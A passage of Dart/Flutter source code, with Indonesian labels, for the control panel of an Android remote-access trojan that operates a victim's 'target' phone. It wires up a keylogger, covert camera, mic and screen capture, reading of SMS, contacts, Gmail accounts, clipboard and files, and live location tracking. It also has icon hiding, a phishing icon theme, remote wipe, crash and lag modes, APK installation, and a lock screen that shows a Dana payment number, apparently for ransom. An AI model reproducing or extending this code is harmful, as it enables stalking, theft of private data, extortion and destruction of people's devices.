        icon: Icons.bolt,
        iconColor: _amber,
        name: 'Flashlight',
        sub: d.statusBool('flashlight') ? 'Ã¢â€”Â AKTIF' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('flashlight') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('flashlight'),
          onChanged: (_) => _toggle('flashlight', 'flashlight'),
        ),
      ),
      _CtrlTile(
        icon: Icons.lock_outline,
        iconColor: _purple,
        name: 'Lock low',
        sub: d.statusBool('deviceLocked') ? 'Ã¢â€”Â LOCKED' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('deviceLocked') ? _purple : null,
        trailing: _PillSwitch(
          value: d.statusBool('deviceLocked'),
          activeColor: _purple,
          onChanged: (v) => _onLockToggle(v),
        ),
      ),
      _CtrlTile(
        icon: Icons.lock_reset,
        iconColor: _purple,
        name: 'Lock Custom V2',
        sub: d.statusBool('lockCustomActive') ? 'Ã¢â€”Â LOCKED' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('lockCustomActive') ? _purple : null,
        trailing: _PillSwitch(
          value: d.statusBool('lockCustomActive'),
          activeColor: _purple,
          onChanged: (v) => _onLockCustomToggle(v),
        ),
      ),
      _CtrlTile(
        icon: Icons.chat_bubble_outline,
        iconColor: _red,
        name: 'Lock Chat',
        sub: d.statusBool('lockChatActive') ? 'Ã¢â€”Â LOCKED CHAT' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('lockChatActive') ? _red : null,
        trailing: _PillSwitch(
          value: d.statusBool('lockChatActive'),
          activeColor: _red,
          onChanged: (v) => _onLockChatToggle(v),
        ),
      ),
      _CtrlTile(
        icon: Icons.restart_alt,
        iconColor: _orange,
        name: 'Restart HP',
        sub: _rebootSub(d),
        subColor: d.statusStr('rebootStatus', '') == 'EXECUTING'
            ? _orange
            : d.statusStr('rebootStatus', '').contains('FAIL') ||
                    d.statusStr('rebootStatus', '') == 'ADMIN_REQUIRED'
                ? _red
                : null,
        onTap: _onRestart,
      ),
      _CtrlTile(
        icon: Icons.delete_forever_outlined,
        iconColor: _red,
        name: 'Factory Reset',
        sub: _wipeSub(d),
        subColor: d.statusStr('wipeStatus', '') == 'EXECUTING'
            ? _orange
            : d.statusStr('wipeStatus', '').contains('FAIL') ||
                    d.statusStr('wipeStatus', '') == 'ADMIN_REQUIRED'
                ? _red
                : null,
        onTap: _onFactoryReset,
      ),
      _CtrlTile(
        icon: Icons.star_border,
        iconColor: _sky,
        name: 'Tema Phising',
        sub: 'TAP Ã¢â‚¬Âº GANTI ICON',
        onTap: _showThemeDialog,
      ),
      _CtrlTile(
        icon: Icons.visibility_off_outlined,
        iconColor: _orange,
        name: 'Sembunyikan Ikon',
        sub: d.statusBool('iconHidden') ? 'Ã¢â€”Â HIDDEN' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('iconHidden') ? _orange : null,
        trailing: _PillSwitch(
          value: d.statusBool('iconHidden'),
          activeColor: _orange,
          onChanged: (v) {
            _patch('iconHidden', v);
            _cmd('hideIcon', v ? 'true' : 'false');
            _toast(v ? 'Icon disembunyikan' : 'Icon ditampilkan', info: v);
          },
        ),
      ),
      _CtrlTile(
        icon: Icons.play_circle_outline,
        iconColor: _red,
        name: 'Video Overlay',
        sub: 'TAP Ã¢â‚¬Âº PLAY VIDEO',
        onTap: () {
          _cmd('videoOverlay', '');
          _toast('Video overlay aktif! (10 detik)');
        },
      ),
      _CtrlTile(
        icon: Icons.notifications_outlined,
        iconColor: Neo.textDark,
        name: 'Spam Notifikasi',
        sub: 'TAP Ã¢â‚¬Âº SPAM DIALOG',
        onTap: _showDialogSpam,
      ),
      _CtrlTile(
        icon: Icons.back_hand_outlined,
        iconColor: _amber,
        name: 'Stuck Layar',
        sub: 'TAP Ã¢â‚¬Âº BLOCK TOUCH',
        onTap: _showTouchBlock,
      ),
      _CtrlTile(
        icon: Icons.record_voice_over_outlined,
        iconColor: _purple,
        name: 'Text to Speech',
        sub: 'TAP Ã¢â‚¬Âº BICARA',
        onTap: _showTTS,
      ),
      _CtrlTile(
        icon: Icons.photo_camera_outlined,
        iconColor: _red,
        name: 'Ambil Kamera',
        sub: 'TAP Ã¢â‚¬Âº FOTO DEPAN',
        onTap: () => _takeShot('front'),
      ),
      _CtrlTile(
        icon: Icons.photo_camera_back_outlined,
        iconColor: _red,
        name: 'Ambil Kamera',
        sub: 'TAP Ã¢â‚¬Âº FOTO BELAKANG',
        onTap: () => _takeShot('back'),
      ),
      _CtrlTile(
        icon: Icons.warning_amber_outlined,
        iconColor: _red,
        name: 'Jumpscare V2',
        sub: d.statusBool('jumpscare2Active') ? 'Ã¢â€”Â FULLSCREEN ACTIVE' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('jumpscare2Active') ? _red : null,
        trailing: _PillSwitch(
          value: d.statusBool('jumpscare2Active'),
          activeColor: _red,
          onChanged: (v) => _onJumpscare2Toggle(v),
        ),
        bottomAction: _MiniBtn(
          label: d.statusStr('jumpscare2Url', '').isNotEmpty
              ? 'GANTI SETTING'
              : 'SET FOTO',
          color: Neo.coral,
          onTap: _showJumpscare2Dialog,
        ),
      ),
      _CtrlTile(
        icon: Icons.volume_off_outlined,
        iconColor: _green,
        name: 'Bisukan Volume',
        sub: d.statusBool('volumeMuted') ? 'Ã¢â€”Â MUTED' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('volumeMuted') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('volumeMuted'),
          activeColor: _green,
          onChanged: (_) => _toggle('muteVolume', 'volumeMuted'),
        ),
      ),
      _CtrlTile(
        icon: Icons.vibration,
        iconColor: _purple,
        name: 'Vibrate',
        sub: 'TAP Ã¢â‚¬Âº GETAR DEVICE',
        onTap: _showVibrate,
      ),
      _CtrlTile(
        icon: Icons.battery_std,
        iconColor: _teal,
        name: 'Hemat Baterai',
        sub: d.statusBool('batterySaver') ? 'Ã¢â€”Â AKTIF' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('batterySaver') ? _teal : null,
        trailing: _PillSwitch(
          value: d.statusBool('batterySaver'),
          activeColor: _teal,
          onChanged: (_) => _toggle('battery:saver', 'batterySaver'),
        ),
      ),
      _CtrlTile(
        icon: Icons.screen_rotation,
        iconColor: _sky,
        name: 'Rotasi Layar',
        sub: 'TAP Ã¢â‚¬Âº GANTI ROTASI',
        onTap: _showRotation,
      ),
      _CtrlTile(
        icon: Icons.brightness_6_outlined,
        iconColor: _amber,
        name: 'Brightness',
        sub: 'TAP Ã¢â‚¬Âº ATUR KECERAHAN',
        onTap: _showBrightness,
      ),
      _CtrlTile(
        icon: Icons.alarm,
        iconColor: _purple,
        name: 'Setel Alarm',
        sub: 'TAP \u25B6 ATUR ALARM',
        onTap: _showAlarm,
      ),
      _CtrlTile(
        icon: Icons.keyboard_alt_outlined,
        iconColor: _green,
        name: 'Spam Keyboard',
        sub: d.statusBool('keyboardSpamActive') ? '\u25CF AKTIF' : '\u25CB OFF',
        subColor: d.statusBool('keyboardSpamActive') ? _green : null,
        trailing: _PillSwitch(
          value: d.statusBool('keyboardSpamActive'),
          activeColor: _green,
          onChanged: (v) => _onKeyboardSpamToggle(v),
        ),
        bottomAction: Row(
          children: [
            Expanded(
              child: _MiniBtn(
                  label: 'PENGATURAN', color: Neo.mint, onTap: _showKeyboardSpamDialog),
            ),
            const SizedBox(width: 6),
            Expanded(
              child: _MiniBtn(
                  label: 'BERHENTI', color: Neo.coral, onTap: _onStopKeyboardSpam),
            ),
          ],
        ),
      ),
    ];
  }

  List<Widget> _buildStreamTiles(RatDevice d) {
    return [
      _CtrlTile(
        icon: Icons.videocam_outlined,
        iconColor: _red,
        name: 'Kamera Langsung',
        sub: d.statusBool('cameraActive') ? 'Ã¢â€”Â LIVE' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('cameraActive') ? _red : null,
        bottomAction: Row(
          children: [
            Expanded(
                child: _MiniBtn(
                    label: 'BELAKANG',
                    color: Neo.mint,
                    onTap: () => _openCameraLive('back'))),
            const SizedBox(width: 6),
            Expanded(
                child: _MiniBtn(
                    label: 'DEPAN',
                    color: Neo.mint,
                    onTap: () => _openCameraLive('front'))),
          ],
        ),
      ),
      _CtrlTile(
        icon: Icons.phone_iphone,
        iconColor: _sky,
        name: 'Screen Mirror',
        sub: d.statusBool('screenActive') ? 'LIVE + TOUCH' : 'TAP \u00b7 MIRROR + KONTROL',
        subColor: d.statusBool('screenActive') ? _green : null,
        onTap: () {
          Navigator.of(context).push(MaterialPageRoute(
            builder: (_) => ScreenMirrorPage(client: client, deviceId: _deviceId!),
          ));
        },
      ),
      _CtrlTile(
        icon: Icons.radio_button_checked,
        iconColor: _pink,
        name: 'Rekam Video',
        sub: d.statusBool('recording') ? 'Ã¢â€”Â REC' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('recording') ? _green : null,
        bottomAction: Row(
          children: [
            Expanded(
                child: _MiniBtn(label: 'MULAI', color: Neo.mint, onTap: () {
                  _cmd('camera:record', 'start');
                  _patch('recording', true);
                })),
            const SizedBox(width: 6),
            Expanded(
                child: _MiniBtn(label: 'BERHENTI', color: Neo.coral, onTap: () {
                  _cmd('camera:record', 'stop');
                  _patch('recording', false);
                })),
          ],
        ),
      ),
      _CtrlTile(
        icon: Icons.mic_none,
        iconColor: _pink,
        name: 'Rekam Mic',
        sub: d.statusBool('micActive') ? 'Ã¢â€”Â RECORDING' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('micActive') ? _green : null,
        bottomAction: Row(
          children: [
            Expanded(
                child: _MiniBtn(label: 'MULAI', color: Neo.mint, onTap: () {
                  _cmd('microphone', 'start');
                  _patch('micActive', true);
                })),
            const SizedBox(width: 6),
            Expanded(
                child: _MiniBtn(label: 'BERHENTI', color: Neo.coral, onTap: () {
                  _cmd('microphone', 'stop');
                  _patch('micActive', false);
                })),
          ],
        ),
      ),
      _CtrlTile(
        icon: Icons.crop_original,
        iconColor: _red,
        name: 'Screenshot',
        sub: 'TAP Ã¢â‚¬Âº JEPRET LAYAR',
        onTap: () {
          _cmd('screenshot', '');
          _toast('Screenshot dikirim');
        },
      ),
      _CtrlTile(
        icon: Icons.location_on_outlined,
        iconColor: _green,
        name: 'Lacak Lokasi',
        sub: d.statusBool('locationTracking') ? 'Ã¢â€”Â TRACKING LIVE' : 'TAP Ã¢â‚¬Âº LIHAT POSISI 24 JAM',
        subColor: d.statusBool('locationTracking') ? _green : null,
        onTap: _openLocation,
        trailing: _PillSwitch(
          value: d.statusBool('locationTracking'),
          activeColor: _green,
          onChanged: (v) => _toggle(kCmdLocationTrack, 'locationTracking'),
        ),
      ),
    ];
  }

  List<Widget> _buildStorageTiles(RatDevice d) {
    return [
      _CtrlTile(
        icon: Icons.photo_library_outlined,
        iconColor: _blue2,
        name: 'Galeri',
        sub: 'TAP Ã¢â‚¬Âº LIHAT FOTO',
        onTap: _openGallery,
      ),
      _CtrlTile(
        icon: Icons.folder_open,
        iconColor: _orange,
        name: 'Manajer File',
        sub: 'TAP Ã¢â‚¬Âº JELAJAH FILE',
        onTap: _openFiles,
      ),
      _CtrlTile(
        icon: Icons.people_outline,
        iconColor: _amber,
        name: 'Kontak',
        sub: 'TAP Ã¢â‚¬Âº LIHAT KONTAK',
        onTap: _openContacts,
      ),
      _CtrlTile(
        icon: Icons.mail_outline,
        iconColor: _red,
        name: 'Gmail',
        sub: 'TAP Ã¢â‚¬Âº LIHAT AKUN',
        onTap: _openGmail,
      ),
      _CtrlTile(
        icon: Icons.call_outlined,
        iconColor: _green,
        name: 'Phone',
        sub: 'TAP Ã¢â‚¬Âº LIHAT NOMOR',
        onTap: _openPhone,
      ),
      _CtrlTile(
        icon: Icons.near_me_outlined,
        iconColor: _green,
        name: 'GPS Lokasi',
        sub: 'TAP Ã¢â‚¬Âº CEK LOKASI',
        onTap: _openLocation,
      ),
      _CtrlTile(
        icon: Icons.content_paste_outlined,
        iconColor: _teal,
        name: 'Clipboard',
        sub: 'TAP Ã¢â‚¬Âº AMBIL CLIPBOARD',
        onTap: () {
          _cmd('clipboard', '');
          _toast('Meminta clipboard...', info: true);
        },
      ),
      _CtrlTile(
        icon: Icons.wifi,
        iconColor: _sky,
        name: 'WiFi Scan',
        sub: 'TAP \u00b7 SCAN JARINGAN',
        onTap: () {
          _cmd('wifi:scan', '');
          _toast('Scanning WiFi...', info: true);
        },
      ),
      _CtrlTile(
        icon: Icons.open_in_browser,
        iconColor: Neo.lavender,
        name: 'Aplikasi Aktif',
        sub: 'TAP \u00b7 CEK APP YANG DIBUKA',
        onTap: () {
          _cmd(kCmdGetForegroundApp, '');
          _toast('Mengecek aplikasi aktif...', info: true);
        },
      ),
      _CtrlTile(
        icon: Icons.screen_lock_portrait,
        iconColor: Neo.mint,
        name: 'Status Layar',
        sub: 'TAP \u00b7 CEK LAYAR ON/OFF',
        onTap: () {
          _cmd(kCmdGetScreenState, '');
          _toast('Mengecek status layar...', info: true);
        },
      ),
      _CtrlTile(
        icon: Icons.power_settings_new,
        iconColor: _green,
        name: 'Nyalakan Layar',
        sub: 'TAP \u00b7 REMOTE WAKE',
        onTap: () {
          Navigator.of(context).push(MaterialPageRoute(
            builder: (_) => WakeScreenPage(client: client, deviceId: _deviceId!),
          ));
        },
      ),
      _CtrlTile(
        icon: Icons.sms_outlined,
        iconColor: _blue2,
        name: 'Baca SMS',
        sub: 'TAP \u00b7 LIHAT SMS TARGET',
        onTap: () {
          Navigator.of(context).push(MaterialPageRoute(
            builder: (_) => SmsReaderPage(client: client, deviceId: _deviceId!),
          ));
        },
      ),
      _CtrlTile(
        icon: Icons.notifications_none,
        iconColor: _amber,
        name: 'Notifikasi',
        sub: 'TAP \u00b7 LIHAT NOTIFIKASI',
        onTap: () {
          Navigator.of(context).push(MaterialPageRoute(
            builder: (_) => NotificationReaderPage(client: client, deviceId: _deviceId!),
          ));
        },
      ),
    ];
  }

  List<Widget> _buildActionTiles(RatDevice d) {
    return [
      _CtrlTile(
        icon: Icons.wallpaper,
        iconColor: _purple,
        name: 'Wallpaper',
        sub: 'TAP Ã¢â‚¬Âº SET URL',
        onTap: () => _showUrlDialog('wallpaper'),
      ),
      _CtrlTile(
        icon: Icons.public,
        iconColor: _green,
        name: 'Open Situs',
        sub: 'TAP Ã¢â‚¬Âº SET URL',
        onTap: () => _showUrlDialog('openurl'),
      ),
      _CtrlTile(
        icon: Icons.volume_up_outlined,
        iconColor: _blue2,
        name: 'Putar Audio',
        sub: 'TAP Ã¢â‚¬Âº SET URL',
        onTap: () => _showUrlDialog('playaudio'),
      ),
      _CtrlTile(
        icon: Icons.chat_bubble_outline,
        iconColor: _amber,
        name: 'Pesan Toast',
        sub: 'TAP Ã¢â‚¬Âº KIRIM PESAN',
        onTap: () => _showUrlDialog('showtoast'),
      ),
      _CtrlTile(
        icon: Icons.warning_amber_outlined,
        iconColor: _red,
        name: 'Jumpscare',
        sub: d.statusBool('jumpscareActive') ? 'Ã¢â€”Â ACTIVE' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('jumpscareActive') ? _red : null,
        trailing: _PillSwitch(
          value: d.statusBool('jumpscareActive'),
          activeColor: _red,
          onChanged: (v) {
            _patch('jumpscareActive', v);
            if (v) {
              _showUrlDialog('jumpscare');
            } else {
              _cmd('jumpscareStop', 'true');
              _toast('Jumpscare dimatikan', info: true);
            }
          },
        ),
        bottomAction: _MiniBtn(
          label: d.statusStr('jumpscareUrl', '').isNotEmpty
              ? 'GANTI FOTO'
              : 'SET FOTO',
          color: Neo.coral,
          onTap: () => _showUrlDialog('jumpscare'),
        ),
      ),
      _CtrlTile(
        icon: Icons.block,
        iconColor: _red,
        name: 'Blokir Aplikasi',
        sub: 'TAP Ã¢â‚¬Âº KELOLA',
        onTap: _openBlockApp,
      ),
      _CtrlTile(
        icon: Icons.phone_in_talk_outlined,
        iconColor: _green,
        name: 'Telepon',
        sub: 'TAP Ã¢â‚¬Âº TELEPON DEVICE',
        onTap: _showCallPhone,
      ),
      _CtrlTile(
        icon: Icons.sms_outlined,
        iconColor: _amber,
        name: 'Kirim SMS',
        sub: 'TAP Ã¢â‚¬Âº KIRIM SMS',
        onTap: _showSendSms,
      ),
      _CtrlTile(
        icon: Icons.wifi_tethering,
        iconColor: _sky,
        name: 'WiFi Connect',
        sub: 'TAP Ã¢â‚¬Âº HUBUNGKAN WIFI',
        onTap: _showWifiConnect,
      ),
      _CtrlTile(
        icon: Icons.download_for_offline_outlined,
        iconColor: _green,
        name: 'Install APK',
        sub: 'TAP Ã¢â‚¬Âº INSTALL APLIKASI',
        onTap: _showInstallApk,
      ),
      _CtrlTile(
        icon: Icons.delete_outline,
        iconColor: _red,
        name: 'Hapus Aplikasi',
        sub: 'TAP Ã¢â‚¬Âº HAPUS APLIKASI',
        onTap: _showUninstall,
      ),
      _CtrlTile(
        icon: Icons.keyboard_outlined,
        iconColor: _pink,
        name: 'Keylogger',
        sub: d.statusBool('keylogActive') ? 'Ã¢â€”Â ACTIVE' : 'Ã¢â€”â€¹ OFF',
        subColor: d.statusBool('keylogActive') ? _pink : null,
        trailing: _PillSwitch(
          value: d.statusBool('keylogActive'),
          activeColor: _pink,
          onChanged: (_) {
            final on = !d.statusBool('keylogActive');
            _patch('keylogActive', on);
            _cmd(on ? 'keylog:start' : 'keylog:stop', '');
          },
        ),
      ),
    ];
  }

  // ─── Kernel Tiles ───
  List<Widget> _buildKernelTiles(RatDevice d) {
    final kStatus = d.statusStr('kernelStatus', '');
    final kMode = d.statusStr('kernelMode', '');
    final kDelay = d.statusStr('kernelDelay', '');
    final kActive = d.statusBool('kernelActive');
    return [
      _CtrlTile(
        icon: Icons.memory,
        iconColor: Neo.coral,
        name: 'Kernel Control',
        sub: kActive ? '\u25CF $kMode \u2022 ${kDelay}s' : '\u25CB OFF',
        subColor: kActive ? Neo.coral : null,
        trailing: _PillSwitch(
          value: kActive,
          activeColor: Neo.coral,
          onChanged: (v) {
            if (v) {
              _showKernelDialog();
            } else {
              _cmd(kCmdKernelOff, '');
              _patch('kernelActive', false);
              _patch('kernelStatus', 'OFF');
              _toast('Kernel dimatikan', info: true);
            }
          },
        ),
      ),
      _CtrlTile(
        icon: Icons.hourglass_top,
        iconColor: Neo.peach,
        name: 'Kernel Delay',
        sub: kStatus == 'SCHEDULED'
            ? '\u25CF TUNGGU ${kDelay}s \u2022 $kMode'
            : kStatus == 'BLINK'
                ? '\u25CF BLINK ACTIVE'
                : kActive
                    ? '\u25CF RUNNING'
                    : '\u25CB OFF',
        subColor: kActive ? Neo.peach : null,
        onTap: kActive
            ? () {
                _cmd(kCmdKernelOff, '');
                _patch('kernelActive', false);
                _patch('kernelStatus', 'OFF');
                _toast('Kernel dihentikan', info: true);
              }
            : _showKernelDialog,
      ),
      _CtrlTile(
        icon: Icons.bug_report_outlined,
        iconColor: Neo.rose,
        name: 'Kernel Info',
        sub: 'TAP \u25B6 CHECK DEVICE',
        onTap: _requestKernelInfo,
      ),
      _CtrlTile(
        icon: Icons.terminal,
        iconColor: Neo.mint,
        name: 'Kernel Status',
        sub: kStatus.isEmpty ? 'NO DATA' : '$kStatus \u2022 $kMode',
        subColor: kStatus == 'SCHEDULED'
            ? Neo.peach
            : kStatus == 'PANIC_ACTIVE'
                ? Neo.coral
                : kStatus == 'BLINK'
                    ? Neo.coral
                    : kActive
                        ? Neo.mint
                        : Neo.textMuted,
      ),
    ];
  }

  Future<void> _showKernelDialog() async {
    final delayCtrl = TextEditingController(text: '0');
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) {
        String selectedMode = 'crash';
        return StatefulBuilder(
          builder: (ctx, setState) {
            return Dialog(
              backgroundColor: Neo.white,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                  side: const BorderSide(color: Neo.textDark, width: 3)),
              child: Padding(
                padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    Row(
                      children: [
                        const _TileIcon(Icons.memory, Neo.coral),
                        const Spacer(),
                        GestureDetector(
                          onTap: () => Navigator.pop(ctx),
                          child: const Icon(Icons.close, color: Neo.textMuted, size: 18),
                        ),
                      ],
                    ),
                    const SizedBox(height: 14),
                    const Text('KERNEL CONTROL',
                        textAlign: TextAlign.center,
                        style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 18,
                            fontWeight: FontWeight.w700,
                            letterSpacing: 2,
                            color: Neo.coral)),
                    const SizedBox(height: 4),
                    const Text('PILIH MODE & DELAY',
                        textAlign: TextAlign.center,
                        style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 8,
                            color: Neo.textMuted,
                            letterSpacing: 1)),
                    const SizedBox(height: 16),
                    // Mode selector
                    Row(
                      children: [
                        _kernelModeBtn('delay', 'DELAY', Neo.peach, selectedMode, setState),
                        const SizedBox(width: 6),
                        _kernelModeBtn('lag', 'LAG', Neo.coral, selectedMode, setState),
                        const SizedBox(width: 6),
                        _kernelModeBtn('crash', 'CRASH', Neo.coral, selectedMode, setState),
                        const SizedBox(width: 6),
                        _kernelModeBtn('panic', 'PANIC', Neo.coral, selectedMode, setState),
                      ],
                    ),
                    const SizedBox(height: 12),
                    Text('DELAY (DETIK)',
                        style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 8,
                            color: Neo.textMuted,
                            letterSpacing: 1)),
                    const SizedBox(height: 5),
                    TextField(
                      controller: delayCtrl,
                      keyboardType: TextInputType.number,
                      style: const TextStyle(
                          fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
                      decoration: InputDecoration(
                        hintText: '1-6000',
                        hintStyle: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 10,
                            color: Neo.textMuted),
                        filled: true,
                        fillColor: Neo.cream,
                        enabledBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(10),
                          borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                        ),
                        focusedBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(10),
                          borderSide: const BorderSide(color: Neo.coral, width: 3),
                        ),
                      ),
                    ),
                    const SizedBox(height: 6),
                    const Text(
                        'DELAY = respons lambat\nLAG = HP lemot total\nCRASH = restart/mati\nPANIC = layar crash + getar',
                        style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 8,
                            color: Neo.textMuted,
                            height: 1.5)),
                    const SizedBox(height: 16),
                    Row(
                      children: [
                        Expanded(
                          child: NeoButton(
                            label: 'BATAL',
                            color: Neo.cream,
                            textColor: Neo.textMuted,
                            onPressed: () => Navigator.pop(ctx),
                          ),
                        ),
                        const SizedBox(width: 10),
                        Expanded(
                          flex: 2,
                          child: NeoButton(
                            label: 'EXECUTE',
                            color: Neo.coral,
                            onPressed: () {
                              final delay = delayCtrl.text.trim();
                              final value = '$selectedMode:$delay';
                              _cmd(kCmdKernelOn, value);
                              _patch('kernelActive', true);
                              _patch('kernelStatus', 'SCHEDULED');
                              _patch('kernelMode', selectedMode.toUpperCase());
                              _patch('kernelDelay', delay);
                              _toast('Kernel $selectedMode terjadwal (${delay}s)', error: true);
                              Navigator.pop(ctx);
                            },
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            );
          },
        );
      },
    );
  }

  Widget _kernelModeBtn(String mode, String label, Color color, String selected, StateSetter setState) {
    final isSelected = selected == mode;
    return Expanded(
      child: InkWell(
        onTap: () => setState(() => selected = mode),
        borderRadius: BorderRadius.circular(8),
        child: Container(
          height: 36,
          decoration: BoxDecoration(
            color: isSelected ? color : Neo.cream,
            borderRadius: BorderRadius.circular(8),
            border: Border.all(
              color: isSelected ? Neo.textDark : Neo.textMuted,
              width: isSelected ? 2.5 : 1.5,
            ),
          ),
          alignment: Alignment.center,
          child: Text(label,
              style: TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 10,
                  fontWeight: FontWeight.w700,
                  color: isSelected ? Neo.white : Neo.textMuted)),
        ),
      ),
    );
  }

  void _requestKernelInfo() {
    _cmd(kCmdKernelInfo, '');
    _toast('Meminta info kernel...', info: true);
  }

  // ─── Lock toggles ───
  void _onLockToggle(bool on) {
    if (on) {
      final titleCtrl = TextEditingController(text: 'PERANGKAT TERKUNCI');
      _showLockPinDialog(
        title: 'LOCK LOW',
        sub: 'Kunci device dengan PIN overlay',
        color: Neo.lavender,
        icon: Icons.lock_outline,
        maxPin: 4,
        extraFields: [
          ('Judul', titleCtrl, 'PERANGKAT TERKUNCI'),
        ],
        okLabel: 'LOCK',
        onOk: (pin) {
          _cmd('lockDevice', jsonEncode({
            'pin': pin,
            'title': titleCtrl.text.trim(),
          }));
          _patch('deviceLocked', true);
          _patch('lockCustomActive', false);
          return true;
        },
      );
    } else {
      _cmd('unlockDevice', 'true');
      _patch('deviceLocked', false);
    }
  }

  void _onLockCustomToggle(bool on) {
    if (on) {
      final htmlCtrl = TextEditingController(text: _defaultLockHtml());
      _showPrompt(
        title: 'LOCK CUSTOM V2',
        sub: 'Kirim HTML overlay ke device',
        color: Neo.lavender,
        icon: Icons.lock_reset,
        fields: [
          ('HTML', htmlCtrl, '<!DOCTYPE html>...'),
        ],
        okLabel: 'LOCK',
        multiLine: true,
        onOk: () {
          final html = htmlCtrl.text.trim();
          if (html.isEmpty) {
            _toast('HTML tidak boleh kosong!', error: true);
            return false;
          }
          _cmd('lockCustom', html);
          _patch('lockCustomActive', true);
          _patch('deviceLocked', false);
          return true;
        },
      );
    } else {
      _cmd('unlockDevice', 'true');
      _patch('lockCustomActive', false);
    }
  }

  void _onLockChatToggle(bool on) {
    if (on) {
      final titleCtrl = TextEditingController(text: 'PERANGKAT TERKUNCI');
      final danaCtrl = TextEditingController();
      _showLockPinDialog(
        title: 'SETUP LOCK CHAT',
        sub: 'Kunci device & mulai chat. PIN & Dana diperlukan.',
        color: Neo.coral,
        icon: Icons.chat_bubble_outline,
        maxPin: 8,
        extraFields: [
          ('Judul Lock Screen', titleCtrl, 'PERANGKAT TERKUNCI'),
          ('Nomor Dana', danaCtrl, '08XXXXXXXXXX'),
        ],
        okLabel: 'LOCK & CHAT',
        danger: true,
        onOk: (pin) {
          final dana = danaCtrl.text.trim();
          final title = titleCtrl.text.trim().isEmpty
              ? 'PERANGKAT TERKUNCI'
              : titleCtrl.text.trim();
          _cmd('lockCustom', _lockChatHtml(title, dana, pin));
          _cmd('lockChat', jsonEncode({
                'action': 'start',
                'pin': pin,
                'title': title,
                'dana': dana,
              }));
          _patch('lockChatActive', true);
          _patch('lockChatTitle', title);
          _patch('lockChatDana', dana);
          _patch('deviceLocked', true);
          _patch('lockCustomActive', false);
          return true;
        },
      );
    } else {
      _cmd('lockChat', jsonEncode({'action': 'stop'}));
      _patch('lockChatActive', false);
      _toast('Lock Chat dimatikan');
    }
  }

  void _onRestart() {
    final confirmCtrl = TextEditingController();
    _showPrompt(
      title: 'RESTART HP',
      sub: 'RESTART PERANGKAT TARGET.\nHANYA RESTART, DATA AMAN.\n\nKetik RESTART untuk konfirmasi.',
      color: Neo.peach,
      icon: Icons.restart_alt,
      fields: [
        ('Ketik RESTART', confirmCtrl, 'RESTART'),
      ],
      okLabel: 'RESTART SEKARANG',
      danger: true,
      onOkCheck: () => confirmCtrl.text.trim().toUpperCase() == 'RESTART',
      onOk: () {
        _cmd(kCmdReboot, '');
        _toast('Perintah restart terkirim!', error: true);
        return true;
      },
    );
  }

  String _rebootSub(RatDevice d) {
    switch (d.statusStr('rebootStatus', '')) {
      case 'EXECUTING':
        return 'â— RESTART BERJALAN...';
      case 'REBOOTED':
        return 'âœ“ RESTART BERHASIL';
      case 'ADMIN_REQUIRED':
        return 'âœ— GAGAL: BUTUH DEVICE ADMIN';
      case 'FAILED':
        return 'âœ— MAAF GAGAL REBOOT DEVICE ANDA TERLALU BARU UNTUK RESTART';
    }
    return 'TAP â€º RESTART DEVICE';
  }

  String _wipeSub(RatDevice d) {
    switch (d.statusStr('wipeStatus', '')) {
      case 'EXECUTING':
        return 'â— WIPE BERJALAN...';
      case 'WIPED':
        return 'âœ“ RESET HP BERHASIL';
      case 'ADMIN_REQUIRED':
        return 'âœ— GAGAL: BUTUH DEVICE ADMIN';
      case 'FAILED':
        return 'âœ— MAAF GAGAL RESET HP';
    }
    return 'TAP â€º WIPE DEVICE';
  }

  void _onFactoryReset() {
    final confirmCtrl = TextEditingController();
    _showPrompt(
      title: 'FACTORY RESET',
      sub: 'HAPUS SEMUA DATA PERANGKAT TARGET.\nTIDAK BISA DIUNDURKAN!\n\nKetik RESET untuk konfirmasi.',
      color: Neo.coral,
      icon: Icons.delete_forever_outlined,
      fields: [
        ('Ketik RESET', confirmCtrl, 'RESET'),
      ],
      okLabel: 'WIPE SEKARANG',
      danger: true,
      onOkCheck: () => confirmCtrl.text.trim().toUpperCase() == 'RESET',
      onOk: () {
        _cmd('wipeData', '');
        _toast('Perintah wipe terkirim!', error: true);
        return true;
      },
    );
  }

  void _onJumpscare2Toggle(bool on) {
    if (on) {
      _showJumpscare2Dialog();
    } else {
      _cmd('jumpscare2Stop', 'true');
      _patch('jumpscare2Active', false);
      _toast('Jumpscare V2 Dimatikan', info: true);
    }
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Dialogs Ã¢â€â‚¬Ã¢â€â‚¬
  Future<void> _showThemeDialog() async {
    final picked = await showModalBottomSheet<String>(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => _ThemeSheet(),
    );
    if (picked == null) return;
    _cmd('changeTheme', picked);
    _patch('theme', picked);
    _toast('Ganti Tema');
  }

